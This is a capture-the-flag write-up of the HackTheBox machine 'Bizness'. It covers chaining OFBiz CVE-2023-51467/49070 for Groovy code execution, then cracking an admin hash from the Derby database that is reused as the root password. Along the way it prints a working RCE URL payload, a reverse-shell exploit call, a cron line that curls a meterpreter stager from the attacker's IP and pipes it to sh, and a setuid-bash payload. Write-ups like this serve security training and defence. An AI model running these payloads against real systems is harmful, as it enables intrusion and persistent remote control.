---
title: "Bizness"
date: 2024-01-06
type: docs
tags:
  - htb
  - linux
  - easy
  - apache-ofbiz
  - cve-2023-49070
  - cve-2023-51467
  - groovy
  - auth-bypass
  - derby
  - hashcat
  - password-reuse
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Debian 11), **Difficulty:** Easy, **Released:** 2024-01-06, **IP:** `10.10.11.252` → `bizness.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. HTTPS site is **Apache OFBiz**. The `ProgramExport` endpoint allows unauthenticated **Groovy** execution. **CVE-2023-51467** (auth bypass: `requirePasswordChange=Y` + a `;` in the path) chained with **CVE-2023-49070** (the Groovy sink).
2. Groovy payload → RCE → shell as **`ofbiz`**. The box is unstable, so drop a cron that re-pulls a stager.
3. OFBiz stores an admin credential hash (`$SHA$<salt>$<b64>`) in its embedded **Derby** database (`runtime/data/derby/ofbiz/seg0/*.dat`). Extract it, fix the URL-safe base64, crack it → the plaintext is **`root`'s password** (reuse) → `su root`.
4. *(Alt privesc)* `ofbiz.service` invokes the **world-writable** `/opt/ofbiz/gradlew`. Overwrite and wait for a restart.

</div>

<div class="callout callout-key">

**Credentials & Flags**


| Where | Value |
| --- | --- |
| OFBiz admin hash → cracked | `monkeybizness` |
| `root` (password reuse) | `monkeybizness` |
| `user.txt` | `/home/ofbiz/user.txt` |
| `root.txt` | `/root/root.txt` |

</div>

---

## Overview

Bizness is what I'd call a pure N-day box: **Apache OFBiz**, an enterprise ERP suite, shipped with a December 2023 pre-auth RCE that was making headlines across the security news cycle right as this machine dropped. I knew going in that the foothold itself would basically be copy-paste once I identified the software, since a public PoC existed within days of disclosure. What actually made this box worth my time was the privilege escalation, which turned into a genuinely satisfying piece of applied forensics rather than another "run a script" exercise. OFBiz keeps its data in an embedded Apache **Derby** database, so getting root meant I had to figure out where Derby actually stores its files on disk, run `strings` against the raw `.dat` files to fish out the admin password hash, understand OFBiz's particular `$SHA$salt$hash` format, and then catch the detail that it encodes that hash as **URL-safe base64** rather than standard base64, which will silently break hashcat if you don't convert it first. Once I had a crackable hash, root came down to simple password reuse between the application admin and the `root` account.

I've grouped this one mentally with the other "N-day web product with a public exploit" boxes I've tackled: [Analytics](/writeups/hackthebox/linux/easy/analytics/) (Metabase), [Monitored](/writeups/hackthebox/linux/medium/monitored/) and [MonitorsTwo](/writeups/hackthebox/linux/easy/monitorstwo/) (Cacti), and [Heal](/writeups/hackthebox/linux/medium/heal/). It also fits the pattern of "crack a hash pulled straight from an application's own database," alongside [MonitorsTwo](/writeups/hackthebox/linux/easy/monitorstwo/) (Cacti's `user_auth` table) and [Cat](/writeups/hackthebox/linux/medium/cat/) (a SQLite `users` table). Seeing that pattern recur across boxes reinforced for me just how often "get a shell as the app user" quietly turns into "you now have offline access to every credential the app has ever stored."

---

## Reconnaissance

```console
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3
80/tcp  open  http     nginx 1.18.0
443/tcp open  ssl/http nginx 1.18.0
| ssl-cert: Subject: commonName=bizness.htb
```

The nmap results told me nginx was just sitting in front of the real application as a reverse proxy, so I pointed a browser at `https://bizness.htb/` and immediately recognized **Apache OFBiz** from the login page and the tell-tale `/accounting` and `/webtools` paths. From there I wanted the exact version before committing to an exploit, so I dug into the footer and `/webtools/control/main`, which gave up the release: an 18.12.x build that predates the patch I already had in mind.

<div class="callout callout-note">

**Fingerprinting OFBiz**

A few things gave the stack away for me: the "OFBiz" branding on the login screen, the `/webtools/`, `/accounting/`, and `/catalog/` context roots sitting off the root path, an `OFBiz.Visitor` cookie in the response headers, and a self-signed certificate issued for the bare hostname. To pin down the exact version I relied on `/webtools/control/main` and the git tag that sometimes leaks through error pages. Anything at or below 18.12.10 is vulnerable to CVE-2023-51467, so once I confirmed the version fell in that range I knew exactly which chain to reach for.

</div>

## Foothold. OFBiz Groovy RCE (CVE-2023-49070 / CVE-2023-51467)

<div class="callout callout-note">

**How the auth bypass works**

OFBiz sits `ProgramExport`, which is a Groovy-eval debug endpoint, behind a login check, so the whole chain hinges on getting past that check without real credentials. **CVE-2023-49070** was the original disclosure, and it required the deprecated XML-RPC endpoint to reach the same sink. The vendor's patch for that turned out to be incomplete, and **CVE-2023-51467** is what exposed the deeper problem: the login check itself can be bypassed. Sending `requirePasswordChange=Y` tricks `checkLogin` into returning `success` without any valid credentials at all, and appending a `;` to the servlet path (`/ProgramExport;/`) is enough to slip past the path-based filter that was supposed to block unauthenticated access. Once that check is defeated, the `USERNAME` field gets handed straight to a `GroovyShell.evaluate()` call, which is a code-execution primitive as the `ofbiz` service user. I like this chain because it's a clean example of how an incomplete patch for one CVE can leave the door open for a second, more fundamental bug in the same code path.

</div>

Before committing to a full reverse shell, I wanted out-of-band confirmation that my payload was actually reaching the Groovy sink, so I sent a callback first: an `nslookup` against my own OAST listener.

```
https://bizness.htb/webtools/control/ProgramExport;/?USERNAME=import+groovy.lang.GroovyShell%3B+String+expression+%3D+%22'nslookup+<oast-id>.oast.live'.execute()%22%3B+GroovyShell+gs+%3D+new+GroovyShell()%3B+gs.evaluate(expression)%3B&PASSWORD=&requirePasswordChange=Y
```

With the callback confirming code execution, there was no reason to hand-roll my own reverse shell logic when a well-tested public PoC already wraps the whole exploit chain. I reached for that instead:

```bash
python3 exploit.py https://bizness.htb/ shell 10.10.14.51:9001
```

![Pasted image 20240108072856](Pasted-image-20240108072856.png)

I noticed pretty quickly that the box kills processes aggressively, which meant my shell kept dying out from under me at inconvenient moments. Rather than fight that behavior directly, I decided to work around it by planting a cron job that pulls and re-executes a stager every minute, so I'd always have a fresh callback coming in even if the current session got reaped:

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.51 LPORT=9002 -f elf > baphomet.bin
(crontab -l 2>/dev/null; echo "* * * * * curl http://10.10.14.51:3333/baphomet.bin | sh") | crontab -
```

With a stable foothold in place I grabbed `user.txt`, which was readable straight away as the `ofbiz` service user.

## Privilege Escalation. Crack the OFBiz admin hash

I ran `linpeas` as my first move on the privesc side, and it flagged two things worth chasing: a writable `gradlew` script and the Derby data directory sitting under the OFBiz install. The Derby angle looked more interesting to me since it pointed at actual credential material rather than just a service-restart trick, so I went after the stored admin hash first:

```bash
grep -rl 'SHA' /opt/ofbiz/runtime/data/derby/ofbiz/seg0/ 2>/dev/null
strings /opt/ofbiz/runtime/data/derby/ofbiz/seg0/*.dat | grep -i '\$SHA\$'
```

<div class="callout callout-note">

**OFBiz hash format & the base64 gotcha**

Once I had the raw hash string in hand, I still had to understand its shape before hashcat could do anything useful with it. OFBiz stores passwords as `$SHA$<salt>$<hash>`, where `<hash>` is `SHA1(salt + password)` encoded as **URL-safe base64** (using `-` and `_` in place of `+` and `/`) with the trailing `=` padding stripped off. That distinction matters because hashcat mode **`-m 120`** (the `sha1($salt.$pass)` layout, built on the same structure as the `md5` variant in `-m 20`) expects standard base64 decoded down to hex, not the URL-safe encoding OFBiz actually uses. I got a garbage crack attempt the first time through until I caught this and converted properly:
```bash
# $SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I   ->  salt "d", URL-safe b64 body
echo 'uP0_QaVBpDWFeo8-dRzDqRwXQ2I' | tr '_-' '/+' | base64 -d | xxd -p
# then feed  <hex>:d  to  hashcat -m 120
```
Running that through hashcat with the corrected encoding cracks in seconds against `rockyou.txt`, and the plaintext turns out to be **`monkeybizness`**.

</div>

```bash
hashcat -m 120 'hash:salt' /usr/share/wordlists/rockyou.txt
```

What made this box click for me was realizing the cracked OFBiz admin password was also **`root`'s** password on the underlying host, a straightforward case of credential reuse between the application and the OS:

```bash
su root        # or: ssh root@bizness.htb
cat /root/root.txt
```

<div class="callout callout-note">

**Alternative privesc, Writable `gradlew`**

The other path linpeas surfaced was worth noting even though I favored the hash crack. `/etc/systemd/system/ofbiz.service` invokes `/opt/ofbiz/gradlew` as part of its startup sequence, and that script is **world-writable**. If I'd wanted root faster and cared less about the forensics angle, I could have overwritten it with a payload (`cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash`) and simply waited for the service to restart, or forced a restart myself. It's a cleaner and faster route to root than cracking a hash, just less instructive about how the application actually protects its credentials.

</div>

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/ofbiz/user.txt` |
| `root.txt` | `/root/root.txt` |

---

## Lessons & Takeaways

- **Patch OFBiz, and patch it fast.** CVE-2023-51467 is unauthenticated, trivially reliable, and wormable in the wrong hands; it was mass-exploited across the internet within days of public disclosure. Any organization running OFBiz that didn't have a same-week patch cycle for this one was almost certainly compromised.
- **Applications ship their own databases, and those databases are attack surface too.** Derby, SQLite, H2, embedded Postgres, whatever it is, I've learned to always figure out where it stores data on disk as soon as I land a shell in the application's service account. What I took away from this box specifically is that a shell as the app user is very often equivalent to offline access to every credential that application has ever stored, not just whatever's currently loaded in memory.
- **Know your base64 variants cold.** URL-safe versus standard base64 will silently hand you a corrupted hash and waste real cracking time before you notice something's wrong. It cost me a failed hashcat run before I caught it here.
- **Service unit files are attack surface in their own right.** Every path an `ExecStart` directive touches deserves a permissions audit, `gradlew` in this case, because a writable script backing a privileged systemd unit is effectively a scheduled root shell waiting to happen.
- **Never reuse the application admin password for `root`.** This is the single mistake that turned a contained application compromise into full host takeover here, and it's a pattern I've now seen repeat across enough boxes that I actively hunt for password reuse as a matter of habit whenever I crack an application-level hash.

---

## Related Writeups

- **N-day web product → public exploit:** [Analytics](/writeups/hackthebox/linux/easy/analytics/), [Monitored](/writeups/hackthebox/linux/medium/monitored/), [MonitorsTwo](/writeups/hackthebox/linux/easy/monitorstwo/), [Heal](/writeups/hackthebox/linux/medium/heal/)
- **Crack a hash from the app's own DB:** [MonitorsTwo](/writeups/hackthebox/linux/easy/monitorstwo/), [Cat](/writeups/hackthebox/linux/medium/cat/)
- **Writable service / script → root:** [Monitored](/writeups/hackthebox/linux/medium/monitored/), [Hack Smarter Security](/writeups/tryhackme/windows/medium/hack-smarter-security/), [Nexus](/writeups/hackthebox/linux/easy/nexus/)
- **Password reuse to `root`:** [Blocky](/writeups/hackthebox/linux/easy/blocky/), [Dog](/writeups/hackthebox/linux/easy/dog/), [Cat](/writeups/hackthebox/linux/medium/cat/)

## References

- CVE-2023-51467 (OFBiz auth bypass) <https://nvd.nist.gov/vuln/detail/CVE-2023-51467>
- CVE-2023-49070 <https://nvd.nist.gov/vuln/detail/CVE-2023-49070>
- OFBiz security advisory <https://cwiki.apache.org/confluence/display/OFBIZ/Security>
- hashcat example hashes <https://hashcat.net/wiki/doku.php?id=example_hashes>
- Derby hash extraction and crack cross-referenced against public writeups for this box.
